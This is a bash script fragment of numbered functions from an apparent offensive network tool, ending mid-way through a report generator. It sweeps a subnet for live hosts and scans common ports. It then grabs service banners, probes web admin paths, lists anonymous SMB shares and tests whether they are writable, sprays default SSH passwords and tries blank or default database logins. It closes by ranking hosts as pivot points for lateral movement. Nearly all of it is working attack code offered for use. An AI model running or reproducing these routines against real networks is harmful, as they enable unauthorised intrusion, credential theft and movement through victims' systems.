bt_201_subnet_parse() {
    local target="${1:-$TARGET}"
    _section "[BT-201] SUBNET CIDR PARSE & RANGE CALCULATION"
    run "Parsing CIDR notation and calculating subnet range..."
    > "$SESSION/bt/subnet_info.txt"
    # Parse CIDR notation
    if echo "$target" | grep -q "/"; then
        local network=$(echo "$target" | cut -d/ -f1)
        local cidr=$(echo "$target" | cut -d/ -f2)
        local ip_int=0
        local IFS=.;
        for octet in $network; do
            ip_int=$(( (ip_int << 8) + octet ))
        done
        unset IFS
        local mask=$(( 0xFFFFFFFF << (32 - cidr) & 0xFFFFFFFF ))
        local network_int=$(( ip_int & mask ))
        local broadcast_int=$(( network_int | (~mask & 0xFFFFFFFF) ))
        # Convert back to dotted notation
        local network_addr="$(( (network_int >> 24) & 0xFF )).$(( (network_int >> 16) & 0xFF )).$(( (network_int >> 8) & 0xFF )).$(( network_int & 0xFF ))"
        local broadcast_addr="$(( (broadcast_int >> 24) & 0xFF )).$(( (broadcast_int >> 16) & 0xFF )).$(( (broadcast_int >> 8) & 0xFF )).$(( broadcast_int & 0xFF ))"
        local host_count=$(( broadcast_int - network_int - 1 ))
        local first_host="$(( (network_int >> 24) & 0xFF )).$(( (network_int >> 16) & 0xFF )).$(( (network_int >> 8) & 0xFF )).$(( (network_int & 0xFF) + 1 ))"
        local last_host="$(( (broadcast_int >> 24) & 0xFF )).$(( (broadcast_int >> 16) & 0xFF )).$(( (broadcast_int >> 8) & 0xFF )).$(( (broadcast_int & 0xFF) - 1 ))"
        echo "NETWORK: ${network_addr}/${cidr}" >> "$SESSION/bt/subnet_info.txt"
        echo "BROADCAST: ${broadcast_addr}" >> "$SESSION/bt/subnet_info.txt"
        echo "HOST RANGE: ${first_host} - ${last_host}" >> "$SESSION/bt/subnet_info.txt"
        echo "TOTAL HOSTS: ${host_count}" >> "$SESSION/bt/subnet_info.txt"
        echo "FIRST_HOST: ${first_host}" >> "$SESSION/bt/subnet_info.txt"
        echo "LAST_HOST: ${last_host}" >> "$SESSION/bt/subnet_info.txt"
        # Save range for other modules
        echo "${first_host}" > "$SESSION/bt/subnet_first_host.txt"
        echo "${last_host}" > "$SESSION/bt/subnet_last_host.txt"
        echo "${network_addr}" > "$SESSION/bt/subnet_network.txt"
        bt "Subnet ${network_addr}/${cidr}: ${host_count} hosts"
    else
        # Single IP — treat as /32
        echo "SINGLE HOST: ${target}" >> "$SESSION/bt/subnet_info.txt"
        echo "${target}" > "$SESSION/bt/subnet_first_host.txt"
        echo "${target}" > "$SESSION/bt/subnet_last_host.txt"
        echo "${target%.*}.0" > "$SESSION/bt/subnet_network.txt"
        info "Single host mode: ${target}"
    fi
    [ -s "$SESSION/bt/subnet_info.txt" ] && bt "Subnet parsed" || info "Subnet parse minimal"
}

bt_202_subnet_mass_discovery() {
    local target="${1:-$TARGET}"
    _section "[BT-202] SUBNET MASS HOST DISCOVERY"
    run "Discovering all live hosts across the subnet..."
    > "$SESSION/bt/subnet_hosts.txt"
    local first=$(cat "$SESSION/bt/subnet_first_host.txt" 2>/dev/null)
    local last=$(cat "$SESSION/bt/subnet_last_host.txt" 2>/dev/null)
    [ -z "$first" ] && { first="${target%.*}.1"; last="${target%.*}.254"; }
    local first_octet4=$(echo "$first" | cut -d. -f4)
    local last_octet4=$(echo "$last" | cut -d. -f4)
    local prefix=$(echo "$first" | cut -d. -f1-3)
    # Parallel ping sweep
    for i in $(seq "$first_octet4" "$last_octet4"); do
        local host="${prefix}.${i}"
        ping -c 1 -W 1 "$host" >/dev/null 2>&1 && {
            echo "HOST UP: ${host}" >> "$SESSION/bt/subnet_hosts.txt"
        } &
        [ $(( (i - first_octet4 + 1) % 30 )) -eq 0 ] && wait
    done
    wait
    local up_count=$(grep -c "HOST UP" "$SESSION/bt/subnet_hosts.txt" 2>/dev/null || echo 0)
    [ "$up_count" -gt 0 ] && bt "${up_count} hosts up in subnet" || info "No hosts discovered (may need local execution)"
}

bt_203_subnet_port_scan() {
    local target="${1:-$TARGET}"
    _section "[BT-203] SUBNET MASS PORT SCAN"
    run "Scanning common ports on all discovered hosts..."
    > "$SESSION/bt/subnet_ports.txt"
    local hosts=$(grep "HOST UP" "$SESSION/bt/subnet_hosts.txt" 2>/dev/null | awk '{print $3}')
    [ -z "$hosts" ] && { info "No hosts to scan — run BT-202 first"; return; }
    local top_ports=(22 23 25 53 80 81 88 110 111 135 139 143 161 389 443 445 465 500 587 593 636 873 902 993 995 1080 1099 1433 1521 2049 2375 3000 3128 3268 3306 3389 5432 5500 5555 5601 5672 5800 5900 5984 6379 6443 7001 7474 8000 8008 8080 8081 8443 8888 9000 9090 9200 9300 9443 9999 11211 27017 50050)
    for host in $hosts; do
        for port in "${top_ports[@]}"; do
            timeout 2 bash -c "echo > /dev/tcp/${host}/${port}" 2>/dev/null && {
                echo "${host}:${port} OPEN" >> "$SESSION/bt/subnet_ports.txt"
            } &
        done
        wait
    done
    local open_count=$(wc -l < "$SESSION/bt/subnet_ports.txt" 2>/dev/null || echo 0)
    [ "$open_count" -gt 0 ] && bt "${open_count} open ports across subnet" || info "No open ports found"
}

bt_204_subnet_service_id() {
    local target="${1:-$TARGET}"
    _section "[BT-204] SUBNET SERVICE IDENTIFICATION"
    run "Identifying services on all open ports across subnet..."
    > "$SESSION/bt/subnet_services.txt"
    [ -f "$SESSION/bt/subnet_ports.txt" ] || { info "No port scan data — run BT-203 first"; return; }
    while IFS=: read -r host port _; do
        [ -z "$host" ] && continue
        # Grab banner
        local banner=$(timeout 3 bash -c "echo | nc -w 2 '${host}' ${port}" 2>/dev/null | head -1 | tr '\n\r' ' ')
        [ -n "$banner" ] && echo "${host}:${port} — ${banner:0:100}" >> "$SESSION/bt/subnet_services.txt"
        # HTTP headers for web ports
        case "$port" in
            80|81|88|443|8000|8008|8080|8081|8443|8888|9000|9090|9200|9443|10000|50050)
                local headers=$(curl -skI --max-time 5 "http://${host}:${port}/" 2>/dev/null | head -5)
                [ -n "$headers" ] && {
                    local srv=$(echo "$headers" | grep -i "^server:" | head -1)
                    [ -n "$srv" ] && echo "${host}:${port} — ${srv}" >> "$SESSION/bt/subnet_services.txt"
                }
                ;;
        esac
    done < "$SESSION/bt/subnet_ports.txt"
    [ -s "$SESSION/bt/subnet_services.txt" ] && bt "Services identified across subnet" || info "Service ID minimal"
}

bt_205_subnet_smb_mass() {
    local target="${1:-$TARGET}"
    _section "[BT-205] SUBNET SMB MASS EXPLOITATION"
    run "Testing SMB null sessions and shares on all hosts with port 445 open..."
    > "$SESSION/bt/subnet_smb.txt"
    local smb_hosts=$(grep ":445 OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null | cut -d: -f1)
    [ -z "$smb_hosts" ] && { info "No SMB hosts found"; return; }
    which smbclient >/dev/null 2>&1 || { info "smbclient not installed"; return; }
    for host in $smb_hosts; do
        echo "=== ${host}:445 ===" >> "$SESSION/bt/subnet_smb.txt"
        timeout 10 smbclient -L "//${host}/" -N 2>/dev/null | head -15 >> "$SESSION/bt/subnet_smb.txt"
        # Test writable shares
        local shares=$(timeout 10 smbclient -L "//${host}/" -N 2>/dev/null | grep -oP '^\s+\K\S+' | grep -v 'Sharename\|---------\|IPC\$' | head -5)
        for share in $shares; do
            local writable=$(timeout 8 smbclient "//${host}/${share}" -N -c "put /dev/null test$$.txt; rm test$$.txt" 2>/dev/null)
            echo "$writable" | grep -q "putting file" && echo "WRITABLE: ${host}/${share}" >> "$SESSION/bt/subnet_smb.txt"
        done
    done
    local writable_count=$(grep -c "WRITABLE:" "$SESSION/bt/subnet_smb.txt" 2>/dev/null || echo 0)
    [ "$writable_count" -gt 0 ] && bt "${writable_count} writable SMB shares found" || info "SMB mass minimal"
}

bt_206_subnet_ssh_spray() {
    local target="${1:-$TARGET}"
    _section "[BT-206] SUBNET SSH CREDENTIAL SPRAY"
    run "Spraying common SSH credentials across all discovered hosts..."
    > "$SESSION/bt/subnet_ssh_spray.txt"
    local ssh_hosts=$(grep ":22 OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null | cut -d: -f1)
    [ -z "$ssh_hosts" ] && { info "No SSH hosts found"; return; }
    which sshpass >/dev/null 2>&1 || { info "sshpass not installed"; return; }
    local users=("root" "admin" "ubuntu" "user" "test" "ansible" "docker")
    local passwords=("root" "admin" "password" "123456" "ubuntu" "password123" "admin123" "root123" "changeme" "toor" "1234" "qwerty" "abc123" "letmein" "welcome")
    for host in $ssh_hosts; do
        local found=0
        for u in "${users[@]}"; do
            for p in "${passwords[@]}"; do
                [ $found -eq 1 ] && break 2
                timeout 5 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=no "${u}@${host}" "id" >/dev/null 2>&1 && {
                    echo "CREDENTIALS: ${u}:${p}@${host}" >> "$SESSION/bt/subnet_ssh_spray.txt"
                    bt "SSH: ${u}:${p}@${host}"
                    found=1
                }
            done
        done
    done
    local cred_count=$(grep -c "CREDENTIALS:" "$SESSION/bt/subnet_ssh_spray.txt" 2>/dev/null || echo 0)
    [ "$cred_count" -gt 0 ] && bt "${cred_count} SSH credentials found in subnet" || info "SSH spray no results"
}

bt_207_subnet_web_discovery() {
    local target="${1:-$TARGET}"
    _section "[BT-207] SUBNET WEB APPLICATION DISCOVERY"
    run "Discovering web applications and admin panels across subnet..."
    > "$SESSION/bt/subnet_web.txt"
    local web_hosts=$(grep -E ':(80|81|88|443|8000|8008|8080|8081|8443|8888|9000|9090|9200|9443|10000|50050) OPEN' "$SESSION/bt/subnet_ports.txt" 2>/dev/null)
    [ -z "$web_hosts" ] && { info "No web hosts found"; return; }
    local admin_paths=("/" "/admin" "/login" "/phpmyadmin" "/phpMyAdmin" "/wp-admin" "/wp-login" "/manager" "/console" "/api" "/swagger" "/swagger-ui" "/actuator" "/jmx-console" "/jenkins" "/gitlab" "/grafana" "/kibana" "/prometheus" "/nagios" "/zabbix" "/cacti" "/tomcat" "/cPanel" "/plesk" "/webmin" "/user" "/management" "/env" "/trace" "/heapdump" "/jolokia" "/api/v1" "/api/v2" "/graphql" "/graphiql" "/portal" "/remote")
    while IFS=: read -r host port _; do
        for path in "${admin_paths[@]}"; do
            local proto="http"
            [ "$port" = "443" ] || [ "$port" = "8443" ] || [ "$port" = "9443" ] && proto="https"
            local code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 4 "${proto}://${host}:${port}${path}" 2>/dev/null)
            [ "$code" = "200" ] && echo "${host}:${port}${path} → HTTP 200" >> "$SESSION/bt/subnet_web.txt"
        done
    done <<< "$web_hosts"
    local web_count=$(wc -l < "$SESSION/bt/subnet_web.txt" 2>/dev/null || echo 0)
    [ "$web_count" -gt 0 ] && bt "${web_count} web endpoints found in subnet" || info "Web discovery minimal"
}

bt_208_subnet_db_mass() {
    local target="${1:-$TARGET}"
    _section "[BT-208] SUBNET DATABASE MASS SCAN"
    run "Testing weak credentials on all databases across subnet..."
    > "$SESSION/bt/subnet_db.txt"
    # MySQL (3306)
    local mysql_hosts=$(grep ":3306 OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null | cut -d: -f1)
    if [ -n "$mysql_hosts" ] && which mysql >/dev/null 2>&1; then
        echo "=== MYSQL (3306) ===" >> "$SESSION/bt/subnet_db.txt"
        for host in $mysql_hosts; do
            timeout 6 mysql -h "$host" -u root -e "SHOW DATABASES;" 2>/dev/null && { echo "${host}:3306 — root (no pass)" >> "$SESSION/bt/subnet_db.txt"; bt "MySQL no-pass: ${host}"; }
            timeout 6 mysql -h "$host" -u root -proot -e "SHOW DATABASES;" 2>/dev/null && echo "${host}:3306 — root:root" >> "$SESSION/bt/subnet_db.txt"
        done
    fi
    # PostgreSQL (5432)
    local pg_hosts=$(grep ":5432 OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null | cut -d: -f1)
    if [ -n "$pg_hosts" ] && which psql >/dev/null 2>&1; then
        echo "" >> "$SESSION/bt/subnet_db.txt"
        echo "=== POSTGRESQL (5432) ===" >> "$SESSION/bt/subnet_db.txt"
        for host in $pg_hosts; do
            timeout 6 psql -h "$host" -U postgres -d postgres -c "\l" 2>/dev/null && { echo "${host}:5432 — postgres (no pass)" >> "$SESSION/bt/subnet_db.txt"; bt "PgSQL no-pass: ${host}"; }
        done
    fi
    # Redis (6379)
    local redis_hosts=$(grep ":6379 OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null | cut -d: -f1)
    if [ -n "$redis_hosts" ]; then
        echo "" >> "$SESSION/bt/subnet_db.txt"
        echo "=== REDIS (6379) ===" >> "$SESSION/bt/subnet_db.txt"
        for host in $redis_hosts; do
            local info=$(timeout 5 bash -c "echo 'INFO server' | nc -w 2 '${host}' 6379" 2>/dev/null | head -5)
            [ -n "$info" ] && echo "${host}:6379 — Redis accessible" >> "$SESSION/bt/subnet_db.txt"
        done
    fi
    # MongoDB (27017)
    local mongo_hosts=$(grep ":27017 OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null | cut -d: -f1)
    if [ -n "$mongo_hosts" ]; then
        echo "" >> "$SESSION/bt/subnet_db.txt"
        echo "=== MONGODB (27017) ===" >> "$SESSION/bt/subnet_db.txt"
        for host in $mongo_hosts; do
            local resp=$(timeout 5 bash -c "echo '{\"isMaster\":1}' | nc -w 2 '${host}' 27017" 2>/dev/null | head -3)
            [ -n "$resp" ] && echo "${host}:27017 — MongoDB accessible" >> "$SESSION/bt/subnet_db.txt"
        done
    fi
    local db_count=$(grep -c "OPEN\|no pass\|no-pass" "$SESSION/bt/subnet_db.txt" 2>/dev/null || echo 0)
    [ "$db_count" -gt 0 ] && bt "${db_count} weak/default databases found" || info "DB mass scan minimal"
}

bt_209_subnet_pivot_map() {
    local target="${1:-$TARGET}"
    _section "[BT-209] SUBNET PIVOT POINT MAPPING"
    run "Mapping optimal pivot points for lateral movement..."
    > "$SESSION/bt/subnet_pivot.txt"
    local pivot_score=0
    # Score each host based on open services
    local hosts=$(grep "HOST UP" "$SESSION/bt/subnet_hosts.txt" 2>/dev/null | awk '{print $3}')
    [ -z "$hosts" ] && { info "No hosts for pivot mapping"; return; }
    for host in $hosts; do
        local host_ports=$(grep "^${host}:" "$SESSION/bt/subnet_ports.txt" 2>/dev/null | wc -l)
        local has_ssh=$(grep -c "^${host}:22 OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null)
        local has_docker=$(grep -c "^${host}:2375 OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null)
        local has_smb=$(grep -c "^${host}:445 OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null)
        local has_web=$(grep -c "^${host}:.*\(80\|443\|8080\) OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null)
        local has_db=$(grep -c "^${host}:\(3306\|5432\|27017\) OPEN" "$SESSION/bt/subnet_ports.txt" 2>/dev/null)
        local score=$(( host_ports * 10 + has_ssh * 50 + has_docker * 100 + has_smb * 30 + has_web * 20 + has_db * 40 ))
        [ "$score" -gt 0 ] && echo "${host} SCORE=${score} ports=${host_ports} ssh=${has_ssh} docker=${has_docker} smb=${has_smb} web=${has_web} db=${has_db}" >> "$SESSION/bt/subnet_pivot.txt"
        [ "$score" -gt "$pivot_score" ] && pivot_score=$score
    done
    # Sort by score descending
    if [ -s "$SESSION/bt/subnet_pivot.txt" ]; then
        sort -t= -k2 -nr "$SESSION/bt/subnet_pivot.txt" -o "$SESSION/bt/subnet_pivot.txt"
        local best=$(head -1 "$SESSION/bt/subnet_pivot.txt" | awk '{print $1}')
        [ -n "$best" ] && bt "Best pivot: ${best} (score: ${pivot_score})"
    fi
    [ -s "$SESSION/bt/subnet_pivot.txt" ] && bt "Pivot points mapped" || info "Pivot mapping minimal"
}

bt_210_subnet_final_report() {
    local target="${1:-$TARGET}"
    _section "[BT-210] SUBNET ATTACK CHAIN FINAL REPORT"
    run "Generating comprehensive subnet assessment report..."
    > "$SESSION/bt/subnet_final_report.txt"
    local hosts_up=$(grep -c "HOST UP" "$SESSION/bt/subnet_hosts.txt" 2>/dev/null || echo 0)
    local ports_open=$(wc -l < "$SESSION/bt/subnet_ports.txt" 2>/dev/null || echo 0)
    local services=$(wc -l < "$SESSION/bt/subnet_services.txt" 2>/dev/null || echo 0)
    local smb_writable=$(grep -c "WRITABLE:" "$SESSION/bt/subnet_smb.txt" 2>/dev/null || echo 0)
    local ssh_creds=$(grep -c "CREDENTIALS:" "$SESSION/bt/subnet_ssh_spray.txt" 2>/dev/null || echo 0)
    local web_endpoints=$(wc -l < "$SESSION/bt/subnet_web.txt" 2>/dev/null || echo 0)
    local db_weak=$(grep -c "no pass\|no-pass\|accessible" "$SESSION/bt/subnet_db.txt" 2>/dev/null || echo 0)
    local pivot=$(head -1 "$SESSION/bt/subnet_pivot.txt" 2>/dev/null | awk '{print $1}')
    cat >> "$SESSION/bt/subnet_final_report.txt" << SUBNETEOF
═══════════════════════════════════════════════════════════════
   SUBNET ASSESSMENT — ${target}
   Date: $(date '+%Y-%m-%d %H:%M:%S')
═══════════════════════════════════════════════════════════════

DISCOVERY RESULTS:
